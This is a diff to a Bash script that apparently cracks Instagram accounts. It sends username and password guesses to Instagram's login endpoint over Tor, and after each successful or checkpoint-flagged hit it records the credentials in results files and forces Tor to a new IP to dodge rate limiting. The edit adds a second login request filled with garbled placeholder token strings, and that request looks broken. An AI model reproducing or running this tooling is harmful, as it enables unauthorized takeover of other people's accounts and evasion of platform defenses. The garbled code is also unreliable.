@@ -48,7 +48,8 @@ _| |        | |_
 
 
 # Dependencies
-function chk_depen(){
+function chk_depen()
+{
 	clear
 	if [[ -f "dependencies.conf" ]]; then
 		sleep 1
@@ -91,7 +92,8 @@ function chk_depen(){
 }
 
 
-function cHk_t0r() {
+function cHk_t0r()
+{
 	cHK=$(curl --socks5-hostname localhost:9050 -s https://check.torproject.org/ > /dev/null; echo $?)
 	if [[ $cHK -gt 0 ]]; then
 		printf "\t${CY}[ϟ] ${RD}TOR Connection is Dead. Type 'tor' or 'service tor start'.\n"
@@ -101,7 +103,8 @@ function cHk_t0r() {
 }
 
 
-function ch4ng3_iP_t0r() {
+function ch4ng3_iP_t0r()
+{
 	killall -HUP tor
 }
 
@@ -115,12 +118,20 @@ function g0_l0g1n(){
 					  -H 'X-Requested-With: XMLHttpRequest' \
 					  --data 'username='$us3rn4m3'&password='$p4sswd'&intent' \
 					  -L --compressed -s -c c00kies.txt | grep -o '"authenticated": true')
+	local cHk_l0g1n2=$(curl -s 'https://www.instagram.com/accounts/login/ajax/' \
+			   -H 'Cookie: csrftoken='$xxxxxxxxxxxxx000000000000000000000000000000000000000000000000000000000000000xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx000000000000000000000000000000000000000xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'' \
+			   -H 'X-Instagram-AJAX: 1' \
+			   -H 'Referer: https://www.instagram.com/' \
+			   -H 'X-CSRFToken:'$xxxxxxxxxxxxx000000000000000000000000000000000000000000000000000000000000000xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx000000000000000000000000000000000000000xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'' \
+			   -H 'X-Requested-With: XMLHttpRequest' \
+			   --data 'username='$us3rn4m3'&password='$p4sswd'&intent' \
+			   -L --compressed -s -c c00kies.txt | grep -o '"authenticated": true')
 	if [[ $cHk_l0g1n =~ '"authenticated": true' ]]; then
 		printf "${GR}[✔] ${RD}Login Success :) [Username: ${GR}$us3rn4m3${RD}] ${RD}[Password: ${GR}$p4sswd${RD}]\n"
 		echo "Username: $us3rn4m3 | Password: $p4sswd" >> account_results_$time.txt
 		sleep 5
 		ch4ng3_iP_t0r
-	elif [[ $cHk_l0g1n =~ 'checkpoint_required' ]]; then
+	elif [[ $cHk_l0g1n2 =~ 'checkpoint_required' ]]; then
 		  printf "${GR}[?] ${PP}Must Verify :3 [Username: ${GR}$us3rn4m3${RD}] ${RD}[Password: ${GR}$p4sswd${RD}]\n"
 		  echo "Username: $us3rn4m3 | Password: $p4sswd" >> account_results_checkpoint_$time.txt
 		  sleep 5
@@ -130,7 +141,8 @@ function g0_l0g1n(){
 	fi
 }
 
-function run(){
+function run()
+{
 	clear
 	chk_depen
 	cHk_t0r
